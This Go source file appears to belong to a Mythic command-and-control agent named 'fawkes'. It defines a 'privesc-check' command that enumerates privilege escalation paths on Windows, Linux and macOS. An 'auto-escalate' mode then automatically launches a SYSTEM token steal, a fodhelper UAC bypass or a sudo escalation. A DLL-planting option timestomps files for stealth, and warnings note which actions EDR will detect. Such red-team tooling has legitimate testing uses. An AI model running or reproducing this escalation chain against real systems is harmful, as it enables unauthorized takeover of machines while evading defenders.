package agentfunctions

import (
	"encoding/json"
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "privesc-check",
		Description:         "Privilege escalation enumeration. Windows: token privileges, unquoted services, AlwaysInstallElevated, auto-logon, UAC. Linux: SUID/SGID, capabilities, sudo, containers, cron hijacking, NFS, systemd units, sudo tokens, PATH hijacking, docker group, dangerous groups, Polkit rules, modprobe hooks, ld.so.preload, security modules. macOS: LaunchDaemons, TCC, dylib hijacking, SIP (T1548)",
		HelpString:          "privesc-check -action <all|...> (Windows: privileges, services, registry, uac, unattend, dll-hijack. Linux: suid, capabilities, sudo, container, cron, nfs, systemd, sudo-token, path-hijack, docker-group, group, polkit, modprobe, ld-preload, security. macOS: launchdaemons, tcc, dylib, sip. Shared: all, writable)",
		Version:             8,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1548", "T1548.001", "T1548.002", "T1574.001", "T1574.002", "T1574.009", "T1574.011", "T1552.001", "T1613", "T1082"},
		ScriptOnlyCommand:   false,
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "privesc_check_new.js"),
			Author:     "@galoryber",
		},
		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
			"privescEnumDone":     privescEnumDone,
			"privescEscalateDone": privescEscalateDone,
		},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"all", "auto-escalate", "privileges", "services", "registry", "uac", "unattend", "writable", "dll-hijack", "dll-plant", "dll-sideload", "service-registry", "suid", "sudo", "capabilities", "container", "cron", "nfs", "systemd", "sudo-token", "path-hijack", "docker-group", "group", "polkit", "modprobe", "ld-preload", "security", "launchdaemons", "tcc", "dylib", "sip"},
				Description:      "Check to perform. auto-escalate: automated chain — enumerate vectors then attempt privilege escalation. Windows: privileges, services, registry, uac, unattend, dll-hijack, dll-plant, dll-sideload (T1574.002), service-registry (T1574.011). Linux: suid, capabilities, sudo, container, cron, nfs, systemd, sudo-token, path-hijack, docker-group, group, polkit, modprobe, ld-preload, security. macOS: launchdaemons, tcc, dylib, sip. Shared: all, writable",
				DefaultValue:     "all",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "source",
				ModalDisplayName: "Source DLL Path",
				CLIName:          "source",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Path to DLL on target (for dll-plant). Upload the DLL first, then reference its local path.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:             "target_dir",
				ModalDisplayName: "Target Directory",
				CLIName:          "target_dir",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Writable directory to plant the DLL in (for dll-plant). Use dll-hijack to find writable PATH dirs.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:             "dll_name",
				ModalDisplayName: "DLL Filename",
				CLIName:          "dll_name",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Name for planted DLL (for dll-plant, e.g. 'fveapi.dll'). Use dll-hijack to find phantom DLL names.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:             "timestomp",
				ModalDisplayName: "Timestomp",
				CLIName:          "timestomp",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				Description:      "Match planted DLL timestamps to kernel32.dll for stealth (for dll-plant, default: true)",
				DefaultValue:     true,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:            "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			var msg string
			if action == "auto-escalate" {
				msg = "OPSEC WARNING: Auto-Escalate Chain will (1) enumerate all privilege escalation vectors, then (2) automatically attempt the best available escalation method. This generates a visible cascade of subtasks. "
				switch taskData.Payload.OS {
				case "Windows":
					msg += "May attempt UAC bypass (registry hijack + process creation) or SYSTEM token steal (OpenProcessToken). Both are high-fidelity EDR detections."
				case "Linux":
					msg += "May attempt sudo escalation. Failed sudo attempts are logged in auth.log."
				case "macOS":
					msg += "May attempt sudo escalation or AppleScript elevation prompt (visible to user)."
				}
			} else {
				msg = "OPSEC WARNING: Privilege escalation enumeration accesses system configuration (services, registry, SUID binaries, sudo, cron, systemd). "
				switch taskData.Payload.OS {
				case "Windows":
					msg += "Queries service configs, registry (AlwaysInstallElevated, auto-logon), UAC status, and token privileges. May trigger alerts for bulk service/registry enumeration."
				case "Linux":
					msg += "Scans SUID/SGID binaries, capabilities, sudoers, cron, NFS, systemd units, docker group, ld.so.preload. File system enumeration may be audited."
				case "macOS":
					msg += "Checks LaunchDaemons, TCC database, dylib hijacking, SIP status. TCC database access may require Full Disk Access."
				}
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: Privilege escalation check completed. Scanning for SUID, writable services, and misconfigs generates extensive file I/O. Results reveal all local escalation paths.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")

			if action == "auto-escalate" {
				display := "Auto-Escalate Chain: enumerate → escalate"
				response.DisplayParams = &display

				// Store OS and integrity context for the completion function
				chainCtx, _ := json.Marshal(map[string]string{
					"os":        taskData.Payload.OS,
					"integrity": fmt.Sprintf("%d", taskData.Callback.IntegrityLevel),
				})
				chainCtxStr := string(chainCtx)
				response.Stdout = &chainCtxStr

				// Step 1: Run full enumeration
				callbackFunc := "privescEnumDone"
				_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
					mythicrpc.MythicRPCTaskCreateSubtaskMessage{
						TaskID:                  taskData.Task.ID,
						SubtaskCallbackFunction: &callbackFunc,
						CommandName:             "privesc-check",
						Params:                  `{"action":"all"}`,
					},
				)
				if err != nil {
					response.Success = false
					response.Error = fmt.Sprintf("Failed to create privesc-check subtask: %s", err.Error())
					return response
				}

				createArtifact(taskData.Task.ID, "Subtask Chain",
					"Auto-Escalate Chain started: privesc-check → conditional escalation")
				return response
			}

			if action != "" && action != "all" {
				response.DisplayParams = &action
			}
			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			host := processResponse.TaskData.Callback.Host

			// Detect high-value privilege escalation vectors
			hasVector := strings.Contains(responseText, "VULNERABLE") ||
				strings.Contains(responseText, "AlwaysInstallElevated") ||
				strings.Contains(responseText, "Unquoted Service Path") ||
				strings.Contains(responseText, "NOPASSWD") ||
				strings.Contains(responseText, "SUID") ||
				strings.Contains(responseText, "writable")

			if hasVector {
				tagTask(processResponse.TaskData.Task.ID, "PRIVESC",
					fmt.Sprintf("Privilege escalation vectors found on %s", host))
			}

			logOperationEvent(processResponse.TaskData.Task.ID,
				fmt.Sprintf("[DISCOVERY] Privilege escalation check on %s", host), false)
			return response
		},
	})
}

// privescEnumDone handles privesc-check enumeration completion. Analyzes results
// and creates an appropriate escalation subtask based on OS and findings.
func privescEnumDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	// Get enumeration results
	responseText := getSubtaskResponses(subtaskData.Task.ID)

	// Get chain context (OS, integrity level)
	chainCtx := extractChainContext(taskData.Task.Stdout)
	osType := chainCtx["os"]
	integrity := chainCtx["integrity"]

	// Analyze results and determine escalation strategy
	var escalationCmd string
	var escalationParams string
	var reason string

	switch osType {
	case "Windows":
		escalationCmd, escalationParams, reason = analyzeWindowsPrivesc(responseText, integrity)
	case "Linux":
		escalationCmd, escalationParams, reason = analyzeLinuxPrivesc(responseText)
	case "macOS":
		escalationCmd, escalationParams, reason = analyzeMacOSPrivesc(responseText)
	default:
		escalationCmd = ""
		reason = "Unknown OS: " + osType
	}

	// Report enumeration summary
	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 1/2] Enumeration complete (%s, integrity=%s).\nAnalysis: %s", osType, integrity, reason)),
	})

	if escalationCmd == "" {
		// No viable escalation path found
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Auto-Escalate: No automatic escalation path found. %s\nReview the privesc-check output for manual exploitation opportunities.", reason)
		response.Stdout = &msg
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID:   taskData.Task.ID,
			Response: []byte(msg),
		})
		return response
	}

	// Step 2: Create escalation subtask
	callbackFunc := "privescEscalateDone"
	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
		mythicrpc.MythicRPCTaskCreateSubtaskMessage{
			TaskID:                  taskData.Task.ID,
			SubtaskCallbackFunction: &callbackFunc,
			CommandName:             escalationCmd,
			Params:                  escalationParams,
		},
	)
	if err != nil {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Auto-Escalate: Failed to create %s subtask: %s", escalationCmd, err.Error())
		response.Stderr = &msg
		return response
	}

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 2/2] Attempting escalation: %s %s", escalationCmd, escalationParams)),
	})

	return response
}

// privescEscalateDone handles escalation subtask completion. Reports final result.
func privescEscalateDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	completed := true
	response.Completed = &completed

	responseText := getSubtaskResponses(subtaskData.Task.ID)
	status := subtaskData.Task.Status

	var summary string
	if status == "error" {
		summary = fmt.Sprintf("=== Auto-Escalate Chain Complete ===\nEscalation attempt: FAILED\nCommand: %s\nError: %s",
			subtaskData.Task.CommandName, responseText)
	} else {
		summary = fmt.Sprintf("=== Auto-Escalate Chain Complete ===\nEscalation attempt: %s\nCommand: %s\nResult: %s",
			strings.ToUpper(status), subtaskData.Task.CommandName, responseText)
	}

	response.Stdout = &summary
	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(summary),
	})

	logOperationEvent(taskData.Task.ID,
		fmt.Sprintf("[PRIVESC] Auto-escalate chain completed (status: %s, method: %s)", status, subtaskData.Task.CommandName), true)

	return response
}

// analyzeWindowsPrivesc determines the best escalation for Windows based on enum results.
func analyzeWindowsPrivesc(enumOutput string, integrity string) (cmd string, params string, reason string) {
	// Integrity levels: 2=medium, 3=high, 4=system
	switch integrity {
	case "4":
		return "", "", "Already running as SYSTEM (integrity=4). No escalation needed."
	case "3":
		// High integrity (admin) — try to get SYSTEM
		if strings.Contains(enumOutput, "SeDebugPrivilege") && strings.Contains(enumOutput, "Enabled") {
			return "getsystem", `{"technique":"steal"}`, "High integrity with SeDebugPrivilege — attempting SYSTEM token steal."
		}
		return "getsystem", `{"technique":"steal"}`, "High integrity (admin) — attempting SYSTEM token steal."
	case "2":
		// Medium integrity — try UAC bypass first
		// Check if UAC is enabled
		if strings.Contains(enumOutput, "EnableLUA") && strings.Contains(enumOutput, "= 0") {
			return "getsystem", `{"technique":"steal"}`, "UAC disabled (EnableLUA=0) — attempting direct SYSTEM token steal."
		}
		return "uac-bypass", `{"technique":"fodhelper"}`, "Medium integrity — attempting UAC bypass via fodhelper."
	default:
		// Low integrity or unknown
		return "", "", fmt.Sprintf("Low/unknown integrity level (%s). No automatic escalation path.", integrity)
	}
}

// analyzeLinuxPrivesc determines the best escalation for Linux based on enum results.
func analyzeLinuxPrivesc(enumOutput string) (cmd string, params string, reason string) {
	// Check if already root
	if strings.Contains(enumOutput, "uid=0") {
		return "", "", "Already running as root. No escalation needed."
	}

	// Check for NOPASSWD sudo rules
	if strings.Contains(strings.ToUpper(enumOutput), "NOPASSWD") {
		// Look for specific NOPASSWD entries
		if strings.Contains(enumOutput, "NOPASSWD: ALL") || strings.Contains(enumOutput, "NOPASSWD:ALL") {
			return "getsystem", `{"technique":"sudo"}`, "Found sudo NOPASSWD ALL — attempting sudo escalation."
		}
		return "getsystem", `{"technique":"sudo"}`, "Found sudo NOPASSWD rules — attempting sudo escalation."
	}

	// Check for sudo token reuse opportunity
	if strings.Contains(enumOutput, "sudo token reuse") && strings.Contains(enumOutput, "POSSIBLE") {
		return "getsystem", `{"technique":"sudo"}`, "Sudo token reuse possible — attempting sudo escalation."
	}

	// Check for docker group membership
	if strings.Contains(enumOutput, "docker") && strings.Contains(enumOutput, "MEMBER") {
		return "", "", "Docker group membership found — manual docker escape available but not automated."
	}

	return "", "", "No automatic escalation path found (no NOPASSWD sudo, no sudo token reuse). Review enum output for manual vectors."
}

// analyzeMacOSPrivesc determines the best escalation for macOS based on enum results.
func analyzeMacOSPrivesc(enumOutput string) (cmd string, params string, reason string) {
	// Check if already root
	if strings.Contains(enumOutput, "uid=0") {
		return "", "", "Already running as root. No escalation needed."
	}

	// Check for NOPASSWD sudo
	if strings.Contains(strings.ToUpper(enumOutput), "NOPASSWD") {
		return "getsystem", `{"technique":"sudo"}`, "Found sudo NOPASSWD rules — attempting sudo escalation."
	}

	// macOS can try osascript prompt (interactive, requires user at desktop)
	return "getsystem", `{"technique":"check"}`, "No passwordless escalation available — running getsystem check to enumerate vectors."
}
